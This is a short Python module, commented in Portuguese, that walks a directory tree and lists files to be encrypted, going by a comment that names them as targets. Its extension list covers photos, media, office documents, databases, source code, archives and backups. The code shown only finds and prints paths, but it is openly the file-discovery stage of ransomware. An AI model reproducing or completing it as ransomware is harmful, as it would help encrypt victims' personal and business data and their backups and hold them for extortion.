
import os

def discover(initial_path):

    # Extenções de possíveis arquivos alvos, que serão encriptados

    extensions = [

        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img', # Arquivos do Sistema

        'jpg', 'jpge', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images    
        'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape', # audios
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3go', # vídeos
        'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', # Microsft Office
        # Open Office, Adobe, Latex, Markdown, etc

        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', 
        'yml', 'yaml', 'json', 'xml', 'csv', # Sdados estruturados e config
        'db', 'sql', 'dbf', 'mdb', 'iso', # banco de dados e imagens de disco

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', #tecnologias web
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # código font C e C++
        'java', 'class', 'jar', # Códigos fonte Java
        'ps', 'bat', 'vb', # scripts de sistemas Windowns
        'awk', 'sh', 'cgi', 'pl','ada', 'swift', # scripts de sistemas unix
        'go', 'py', 'pyc', 'bf', 'coffe', # outros tipos de códigos fontes

        'zip', 'rar', 'tar', 'tgz', 'bz2', '7z', 'bak', # arquivos compactados e backups
    ]

    for dirpath, dirs, files in os.walk(initial_path):
        for _file in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, _file))
            ext = absolute_path.split('.')[-1]
            if ext in extensions:
                yield absolute_path

    # isso aqui só é executado, quando você execut ao módulo diretamente

if __name__ == '__main__':

    x = discover(os.getcwd())
    for i in x:
        print(i)